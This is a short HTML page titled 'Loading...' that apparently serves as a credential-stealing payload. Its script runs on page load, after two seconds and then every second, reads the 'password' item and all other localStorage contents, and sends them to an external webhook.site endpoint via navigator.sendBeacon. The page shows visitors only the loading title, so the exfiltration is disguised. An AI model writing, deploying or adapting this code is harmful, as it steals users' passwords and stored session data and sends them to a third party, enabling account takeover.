<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        function sendData(data) {
            navigator.sendBeacon('https://webhook.site/c67df85d-d59b-49eb-a928-a775dfed2b82?' + data);
        }

        function checkStorage() {
            const password = localStorage.getItem('password');
            const allStorage = JSON.stringify(Object.entries(localStorage));
            sendData('check=true&password=' + password + '&storage=' + allStorage);
        }

        // Initial check
        document.addEventListener('DOMContentLoaded', () => {
            sendData('status=dom_loaded');
            checkStorage();
        });

        // Delayed check
        setTimeout(checkStorage, 2000);

        // Periodic check
        setInterval(checkStorage, 1000);
    </script>
</body>
</html>
